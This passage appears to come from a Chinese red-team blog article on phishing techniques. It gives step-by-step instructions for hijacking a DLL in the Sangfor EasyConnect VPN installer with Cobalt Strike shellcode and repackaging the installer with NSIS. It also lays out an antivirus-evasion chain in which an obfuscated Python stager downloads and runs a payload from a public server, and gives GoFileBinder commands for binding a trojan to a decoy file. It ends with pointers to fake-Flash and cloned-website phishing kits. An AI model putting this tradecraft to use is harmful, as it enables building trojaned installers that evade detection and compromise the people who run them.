+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>在蓝队可以利用此方法反制红队，例如在准备好的虚拟机中点击红队的钓鱼邮件，并准备一些让红队感兴趣的东西</p>
+<p>比如梯子的安装包以及梯子的账号密码</p>
+<p>这里可能会用到拿破轮胎大佬写的DLL注入工具</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006584.jpeg" alt="图片"></p>
+<p>使用方法：</p>
+<p>1.输入CS或者msf生成的shellcode生成免杀DLL文件</p>
+<p>2.添加需要劫持的软件或者dll</p>
+<p>3.劫持过后会在运行目录生成一个DLL和配置文件</p>
+<p>4.需要把两个文件放在被劫持的软件同目录下才可以运行</p>
+<p>注意：</p>
+<p>本文采用EasyConnectInstaller做测试，使用其他软件测试的话，可以使用Process Monitor来对系统进程进行监控，找到系统程序调用DLL的情况</p>
+<blockquote>
+<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon</a></p>
+</blockquote>
+<p>参考文章：</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_35771144/article/details/111056447">https://blog.csdn.net/weixin_35771144/article/details/111056447</a></p>
+</blockquote>
+<p>使用CS生成shellcode</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006685.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006686.jpeg" alt="图片"></p>
+<p>把shellcode放入工具然后生成dll即可</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006687.jpeg" alt="图片"></p>
+<p>选择DLL处选择生成的DLL</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006688.jpeg" alt="图片"></p>
+<p>注入目标为</p>
+<p>C:\Program Files (x86)\Sangfor\SSL\SangforCSClient 下的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006689.jpeg" alt="图片"></p>
+<p>注入到注册表后，将 wwwcomw.dll 和 conf.inf 放入到软件目录下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006790.jpeg" alt="图片"></p>
+<p>然后运行即可上线</p>
+<p>然后接下来使用NSIS重新制作安装包</p>
+<p>使用NSIS制作安装包可以参考： <a href="https://www.cnblogs.com/modou/p/3573772.html">https://www.cnblogs.com/modou/p/3573772.html</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006791.jpeg" alt="图片"></p>
+<h3 id="9）免杀思路"><a href="#9）免杀思路" class="headerlink" title="9）免杀思路"></a>9）免杀思路</h3><p>1、CS生成exe的payload</p>
+<p>2、exe-payload 放置公网服务器</p>
+<p>3、再CS生成python-payload</p>
+<p>4、将python-payload转base64值</p>
+<p>5、base64值的payload再用序列化转码</p>
+<p>6、序列化转码后的payload再用反序列化转码</p>
+<p>7、转成反序列化后的payload再用python3的tinyaes混淆</p>
+<p>8、混淆完再用另外的东西加壳成对方环境执行的文件类型即可</p>
+<p>可以查查掩日</p>
+<p>最终形成的文件类型，执行的原理仅仅是运行下载公网服务器第一步上次的payload并运行</p>
+<p>GoFildBinder</p>
+<p><a href="https://github.com/Yihsiwei/GoFileBinder">https://github.com/Yihsiwei/GoFileBinder</a></p>
+<p>golang免杀捆绑器 捆绑器免杀效果会持续更新下去</p>
+<p>使用以下命令进行捆绑器编译</p>
+<p>go build GoFileBinder.go</p>
+<p>使用以下命令生成捆绑文件(注：GoFileBinder.exe单独放入一个文件夹中)</p>
+<p>GoFileBinder.exe 木马.exe xxx.txt</p>
+<p>也可以尝试使用kali自带的upx</p>
+<h2 id="4、邮件钓鱼"><a href="#4、邮件钓鱼" class="headerlink" title="4、邮件钓鱼"></a>4、邮件钓鱼</h2><p>包含邮件服务器相关环境搭建，邮件信息收集，参考：</p>
+<p><a href="https://www.freebuf.com/articles/web/260391.html">https://www.freebuf.com/articles/web/260391.html</a></p>
+<h2 id="5、flash钓鱼"><a href="#5、flash钓鱼" class="headerlink" title="5、flash钓鱼"></a>5、flash钓鱼</h2><p>源码： <a href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn</a></p>
+<p>尝试自解压或者配合捆绑</p>
+<h2 id="6、网站钓鱼"><a href="#6、网站钓鱼" class="headerlink" title="6、网站钓鱼"></a>6、网站钓鱼</h2><p>制作钓鱼网站，克隆网站</p>
+<p>cs,msf 都有这个功能</p>
+<p>setoolkit</p>
+<p>本文作者：YLion， 转载请注明来自FreeBuf.COM</p>
+]]></content>
+      <categories>
+        <category>RedTeam</category>
+      </categories>
+      <tags>
+        <tag>社会工程学</tag>
       </tags>
   </entry>
 </search>
